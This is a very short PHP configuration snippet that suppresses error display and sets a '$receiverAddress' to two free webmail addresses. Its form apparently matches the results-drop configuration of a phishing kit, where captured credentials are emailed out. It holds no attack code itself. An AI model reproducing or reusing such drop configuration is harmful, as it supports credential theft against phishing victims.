<?php
ini_set('display_errors', 0);
$receiverAddress = "richardsmith292929@gmail.com,richardsmith292929@yandex.com";


?>